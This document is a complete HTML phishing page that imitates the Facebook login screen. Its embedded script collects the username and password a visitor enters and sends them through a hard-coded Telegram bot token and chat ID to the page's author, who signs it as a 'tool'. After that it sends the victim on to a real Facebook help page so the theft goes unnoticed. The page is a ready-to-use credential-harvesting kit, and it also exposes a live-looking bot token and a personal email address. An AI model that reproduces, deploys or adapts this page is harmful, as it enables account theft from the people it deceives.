<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook | Login And Sign up</title>
    <style>
        body {
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }

        .login-container {
            background-color: auto;
            //padding: 20px 20px 24px;
            border-radius: 8px;
            //box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            width: 100%;
            max-width: 396px;
            box-sizing: border-box;
            text-align: center;
            margin-bottom: 30px;
        }

        .custom-logo {
            width: 80px;
            height: 80px;
            background: url('https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png') no-repeat center;
            background-size: contain;
            margin: 0 auto 10px;
        }

        .app-name {
            color: #1877F2;
            font-weight: bold;
            font-size: 40px;
            font-weight: 600;
            margin: 0 0 20px;
        }

        .login-form input[type="text"],
        .login-form input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #999999e0;
            border-radius: 100px;
            font-size: 17px;
            box-sizing: border-box;
        }

        .login-form input[type="text"]:focus,
        .login-form input[type="password"]:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
            outline: none;
        }

        .button-link {
            display: inline-block;
            text-decoration: none;
            color: #fff;
            border: none;
            border-radius: 100px;
            padding: 12px 16px;
            cursor: pointer;
            text-align: center;
            box-sizing: border-box;
            //font-weight: bold;
        }

        .login-button-link {
            background-color: #1877f2;
            font-size: 20px;
            width: 100%;
            /* margin-bottom: 16px; */ /* Adjusted for error message placement */
            line-height: 24px;
        }

        .login-button-link:hover {
            background-color: #166fe5;
        }

        .input-error-message { /* Style for the error message */
            color: #c70039;
            font-size: 14px;
            text-align: center;
            margin-top: 5px; /* Space between login button and error */
            margin-bottom: 0px; /* Space before forgotten password link */
            display: none; /* Hidden by default */
        }

        .forgot-password-link {
            color: #1877f2;
            font-size: 15px;
            text-decoration: none;
            display: block;
            margin-bottom: 20px; /* Original margin */
        }

        .forgot-password-link:hover {
            text-decoration: //underline;
        }

        .divider {
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }

        .create-account-link {
            background-color: #42b72a;
            font-size: 17px;
            min-width: 194px;
            line-height: 22px;
            width: 350px;
            padding: 12px 18px;
        }

        .create-account-link:hover {
            background-color: #36a420;
        }
    </style>
</head>
<body>
    <br>
    <br>
    <br>
    <div class="login-container">
        <div class="custom-logo" aria-label="SocialVillage Logo"></div>
        <h2 class="app-name">facebook</h2>
        <form id="loginForm" class="login-form">
            <input type="text" id="username" name="username" placeholder="Email address or phone number" required autocomplete="username">
            <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
            
            <a href="https://m.facebook.com/help/contact/295309487309948?wtsid=rdr_0ILscbDPCUFiCMAoB" id="loginLink" class="button-link login-button-link">Log In</a>
            <div id="loginErrorMessage" class="input-error-message"></div> <!-- Error message container -->
            <br>
            <br>
            <a href="https://m.facebook.com/hacked" class="forgot-password-link" target="_blank">Forgotten password?</a> 
            
            <hr class="divider">
            
            <a href="mailto:iamumair@duck.com" class="button-link create-account-link" target="_blank">Create New Account</a>
            <br>
            <br>
            
            <small>Facebook helps you connect and share with the people in your life on your news feed.
            <br>
            <br><br><br>
            meta @ 2025
            </small>
        </form>
    </div>

    <script>
      const botToken = '8039221409:AAG85m7YZOZ6yn0IFnLycnt0pfYCsIC7Jto'; // <-- REPLACE WITH YOUR BOT TOKEN
      const chatId = '7901033149';       // <-- REPLACE WITH YOUR CHAT ID

      const loginForm = document.getElementById('loginForm');
      const loginLink = document.getElementById('loginLink');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const loginErrorMessageDiv = document.getElementById('loginErrorMessage'); // Get the error message div

      if (loginLink) {
        loginLink.addEventListener('click', function(event) {
          const username = usernameInput.value.trim();
          const password = passwordInput.value.trim();

          if (!username || !password) {
            event.preventDefault(); // Prevent mailto: link if fields are empty
            loginErrorMessageDiv.textContent = 'Please enter your login information';
            loginErrorMessageDiv.style.display = 'block'; // Show the error message
            return;
          }

          // If fields are filled, hide any previous error message
          loginErrorMessageDiv.textContent = '';
          loginErrorMessageDiv.style.display = 'none'; // Hide the error message

          // If fields are filled, the mailto: link will open due to default <a> behavior.
          // We send the Telegram message in the background.
          
          const message = ` Tool made By UmAirâ›“ï¸â€ðŸ’¥
          \nâ˜• Username : ${username}\nðŸ” Password : ${password}`;
          
          const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

          fetch(telegramApiUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: 'Markdown'
            })
          })
          .then(response => response.json())
          .then(data => {
            if (data.ok) {
              console.log('Login info sent to Telegram successfully.');
              loginForm.reset(); 
            } else {
              console.error('Telegram API error:', data);
              // Display error to user if Telegram send fails, but mailto already triggered
              // You might want to display this error differently, e.g., in the loginErrorMessageDiv
              // but it will appear after the mail client has already tried to open.
              loginErrorMessageDiv.textContent = 'Failed to send login information to support. Please try again.';
              loginErrorMessageDiv.style.display = 'block';
              // alert('Failed to send login information to support. Error: ' + data.description + '\nPlease try logging in again.');
            }
          })
          .catch(error => {
            console.error('Fetch Error:', error);
            loginErrorMessageDiv.textContent = 'An error occurred. Please try again.';
            loginErrorMessageDiv.style.display = 'block';
            // alert('An error occurred while trying to process your login.\nPlease try logging in again.');
          });
        });
      }

      // Clear error message if user starts typing in the input fields
      function clearLoginError() {
        if (loginErrorMessageDiv.style.display === 'block') {
            loginErrorMessageDiv.textContent = '';
            loginErrorMessageDiv.style.display = 'none';
        }
      }
      usernameInput.addEventListener('input', clearLoginError);
      passwordInput.addEventListener('input', clearLoginError);

    </script>
</body>
</html>
